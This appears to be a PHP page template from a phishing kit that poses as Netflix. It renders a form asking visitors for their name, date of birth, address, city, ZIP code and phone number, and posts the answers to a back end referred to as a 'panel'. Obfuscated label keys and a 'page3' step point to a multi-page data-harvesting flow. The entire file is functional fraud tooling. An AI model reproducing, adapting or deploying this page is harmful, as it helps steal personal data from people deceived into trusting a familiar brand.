<?php
require_once 'config/panel.php';
$title = "Netflix";
ob_start();
?>

<div class="container d-flex flex-column justify-content-start align-items-center my-3">
     <form class="w-100 p-2 d-flex flex-column justify-content-center align-items-center shadow-lg rounded-2" method="post" action="index.php?id=<?= md5(time()) ?>">
     <input type="hidden" name="catch">

     <h1 class="m-0 p-0"><?= lang("xinfoz1"); ?></h1>
     <p></p>
<div class="w-100 form-floating mb-4">
  <input name="name" type="text" class="form-control <?php if ($_SESSION['ERRORS']['name']) { echo 'is-invalid'; } ?>" placeholder="" value="<?php if (!empty($_SESSION['sname'])){ echo $_SESSION['sname'];} ?>" id="floatingInput" placeholder="name@example.com">
  <label for="floatingInput"><?= lang("xinfoz2"); ?></label>
  <div  class="invalid-feedback"><?= lang("xinfoz3"); ?></div>
</div>
<div class="w-100 form-floating mb-4">
  <input name="dob" type="tel" class="date form-control <?php if ($_SESSION['ERRORS']['dob']) { echo 'is-invalid'; } ?>" value="<?php if (!empty($_SESSION['sdob'])){ echo $_SESSION['sdob'];} ?>" id="floatingInput" placeholder="name@example.com">
  <label for="floatingInput"><?= lang("xinfoz4"); ?></label>
  <div  class="invalid-feedback"><?= lang("xinfoz3"); ?></div>
</div>
<div class="w-100 form-floating mb-4">
  <input name="adress" type="text" class="form-control <?php if ($_SESSION['ERRORS']['adress']) { echo 'is-invalid'; } ?>" value="<?php if (!empty($_SESSION['sadress'])){ echo $_SESSION['sadress'];} ?>" id="floatingInput" placeholder="name@example.com">
  <label for="floatingInput"><?= lang("xinfoz5"); ?></label>
  <div  class="invalid-feedback"><?= lang("xinfoz3"); ?></div>
</div>
<div class="w-100 form-floating mb-4">
  <input name="city" type="text" class="form-control <?php if ($_SESSION['ERRORS']['city']) { echo 'is-invalid'; } ?>" value="<?php if (!empty($_SESSION['scity'])){ echo $_SESSION['scity'];} ?>" id="floatingInput" placeholder="name@example.com">
  <label for="floatingInput"><?= lang("xinfoz6"); ?></label>
  <div  class="invalid-feedback"><?= lang("xinfoz3"); ?></div>
</div>
<div class="w-100 form-floating mb-4">
  <input name="zip" type="text" class="form-control <?php if ($_SESSION['ERRORS']['zip']) { echo 'is-invalid'; } ?>" value="<?php if (!empty($_SESSION['szip'])){ echo $_SESSION['szip'];} ?>" id="floatingInput" placeholder="name@example.com">
  <label for="floatingInput"><?= lang("xinfoz7"); ?></label>
  <div  class="invalid-feedback"><?= lang("xinfoz3"); ?></div>
</div>
<div class="w-100 form-floating mb-4">
  <input name="phone" type="tel" class="form-control <?php if ($_SESSION['ERRORS']['phone']) { echo 'is-invalid'; } ?>" value="<?php if (!empty($_SESSION['sphone'])){ echo $_SESSION['sphone'];} ?>" id="floatingInput" placeholder="name@example.com">
  <label for="floatingInput"><?= lang("xinfoz9"); ?></label>
  <div  class="invalid-feedback"><?= lang("xinfoz3"); ?></div>
</div>
<p class="light-font pdef"><?= lang("xinfoz10"); ?></p>
<button class="btn btn-danger w-100" type="submit" name="submit" value="page3"><?= lang("xinfoz11"); ?></button>
    </form>
</div>
<script src="assets/js/cleave.js"></script>
    <script src="assets/js/mainDate.js"></script>
<?php $content = ob_get_clean(); ?>
<?php require_once 'views/layout_dash.php' ?>